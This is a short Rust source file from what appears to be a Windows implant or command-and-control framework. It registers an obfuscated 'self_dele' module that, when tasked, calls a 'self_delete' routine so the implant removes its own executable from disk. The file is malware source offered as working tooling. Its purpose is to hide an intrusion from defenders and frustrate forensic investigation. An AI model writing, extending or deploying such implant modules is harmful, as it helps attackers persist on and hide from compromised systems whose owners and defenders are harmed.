use crate::prelude::*;
use malefic_os_win::kit::hide::self_delete;

pub struct SelfDele {}

#[async_trait]
#[module_impl("self_dele")]
impl Module for SelfDele {}

#[async_trait]
#[obfuscate]
impl ModuleImpl for SelfDele {
    async fn run(&mut self, id: u32, receiver: &mut Input, _: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::Common)?;
        if req.string_array.is_empty() {
            return to_error!(Err("Stream name is needed".to_string()));
        }
        unsafe {
            self_delete(&req.string_array[0]);
        }

        Ok(TaskResult::new(id))
    }
}
